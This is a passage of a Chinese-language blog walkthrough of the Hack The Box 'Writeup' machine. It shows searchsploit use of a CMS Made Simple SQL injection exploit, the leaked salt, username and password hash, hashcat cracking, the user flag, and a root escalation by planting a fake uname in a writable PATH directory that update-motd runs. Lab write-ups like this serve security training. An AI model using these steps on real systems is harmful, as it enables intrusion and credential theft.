Simple Module Download Manager 1.4.1 - Arbitrary File Upload                                                                                                       | php/webapps/34298.py</span><br><span class="line">CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload                                                                                              | php/webapps/46546.py</span><br><span class="line">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用这一条：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CMS Made Simple &lt; 2.2.10 - SQL Injection | php/webapps/46635.py</span><br><span class="line"></span><br><span class="line">┌──(tiger㉿kali)-[~/桌面/hack-the-box]</span><br><span class="line">└─$ searchsploit -m php/webapps/46635.py</span><br><span class="line">  Exploit: CMS Made Simple &lt; 2.2.10 - SQL Injection</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/46635</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/php/webapps/46635.py</span><br><span class="line">File Type: Python script, ASCII text executable</span><br><span class="line"></span><br><span class="line">Copied to: /home/tiger/桌面/hack-the-box/46635.py</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>执行后，得到几个信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Salt <span class="keyword">for</span> password found: 5a599ef579066807</span><br><span class="line">[+] Username found: jkr</span><br><span class="line">[+] Email found: jkr@writeup.htb</span><br><span class="line">[+] Password found: 62def4866937f08cc13bab43bb14e6f7</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用hashcat进行破解</p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221213001822043.png" alt="image-20221213001822043"></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221213002229646.png" alt="image-20221213002229646"></p>
+<h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><p>ssh登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jkr@writeup:~$ <span class="built_in">ls</span> ./</span><br><span class="line">user.txt</span><br><span class="line">jkr@writeup:~$ <span class="built_in">cat</span> user.txt </span><br><span class="line">13142f5a92b45a42150dfcc445ba1dff</span><br><span class="line">jkr@writeup:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用<code>pspy32</code>监测进程信息</p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221213011738020.png" alt="image-20221213011738020"></p>
+<p><strong>关于motd信息</strong></p>
+<blockquote>
+<p><strong>motd</strong>是message of the day的缩写，意思是“当天的提示信息”，通常在用户成功登录到Linux后出现，该信息可以从&#x2F;etc&#x2F;motd文本文件中找到。</p>
+<p>在Ubuntu中有<strong>update-motd</strong>来帮助系统管理员或用户实现这个功能。可执行的脚本位于&#x2F;etc&#x2F;update-motd.d&#x2F;*下，在每次登录时以root身份由pam_motd调用，脚本运行的次序由run-parts（run scripts or programs in a directory，在一个目录里运行脚本或程序）的–lsbsysinit选项决定。pam_motd也支持不动态更新，只需要在其选项中添加noupdate即可。</p>
+</blockquote>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221213012124291.png" alt="image-20221213012124291"></p>
+<h4 id="PATH劫持"><a href="#PATH劫持" class="headerlink" title="PATH劫持"></a>PATH劫持</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jkr@writeup:/usr/local$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span><br><span class="line">jkr@writeup:/usr/local$ <span class="built_in">cat</span> /etc/update-motd.d/10-<span class="built_in">uname</span> </span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="built_in">uname</span> -rnsom</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>如上，可知道<code>/usr/local/bin</code>为PATH的一个路径，而10-uname文件为执行<code>uname</code>命令。一个思路：<strong>在可写的路径下放置一个我们设置好的uname文件</strong></p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221213013454441.png" alt="image-20221213013454441"></p>
+<p>搞定</p>
+<p><img src="/2022/11/27/WP-HTB-Password-Cracking/image-20221213014244847.png" alt="image-20221213014244847"></p>
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>从官方的报告中，一些提升点</p>
+<ul>
+<li>使用<code>Burpsuite</code>功能：Send to spider进行目标网站抓取</li>
+<li>wappalyzer：识别CMS</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install npm</span><br><span class="line">npm -i -g wappalyzer</span><br><span class="line"><span class="comment"># jq进行命令行json解析</span></span><br><span class="line">wappalyzer url|jq</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>反弹shell</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9488">https://xz.aliyun.com/t/9488</a></p>
+<ul>
+<li>chmod a+x</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/11/27/WP-HTB-Password-Cracking/" data-id="claz6ngpy0000w39ye0dcdy16" data-title="WP-HTB-Password Cracking" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HTB/" rel="tag">HTB</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pentest/" rel="tag">Pentest</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/11/28/Android%E6%8A%93%E5%8C%85%E6%80%BB%E7%BB%93/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          Android抓包总结
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/11/27/MyLogs/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">MyLogs</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTB/" rel="tag">HTB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IoT/" rel="tag">IoT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pentest/" rel="tag">Pentest</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" rel="tag">二进制</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%94%9F%E6%B4%BB/" rel="tag">生活</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%BB%91%E6%8A%80%E8%83%BD/" rel="tag">黑技能</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/HTB/" style="font-size: 10px;">HTB</a> <a href="/tags/IoT/" style="font-size: 10px;">IoT</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" style="font-size: 10px;">二进制</a> <a href="/tags/%E7%94%9F%E6%B4%BB/" style="font-size: 10px;">生活</a> <a href="/tags/%E9%BB%91%E6%8A%80%E8%83%BD/" style="font-size: 10px;">黑技能</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">十二月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">十一月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">四月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/12/15/Fuzzing%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0%E6%95%B4%E7%90%86/">Fuzzing技术文章整理</a>
+          </li>
+        
+          <li>
+            <a href="/2022/11/30/%E8%BD%A6%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%80%E8%A7%88/">车联网渗透测试一览</a>
+          </li>
+        
+          <li>
+            <a href="/2022/11/28/Android%E6%8A%93%E5%8C%85%E6%80%BB%E7%BB%93/">Android抓包总结</a>
+          </li>
+        
+          <li>
+            <a href="/2022/11/27/WP-HTB-Password-Cracking/">WP-HTB-Password Cracking</a>
+          </li>
+        
+          <li>
+            <a href="/2022/11/27/MyLogs/">MyLogs</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+        <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/88x31.png" /></a></br>
+All website licensed under <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">CC BY-NC-ND 4.0</a></br>
+      
+      &copy; 2022 尘埃落定<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
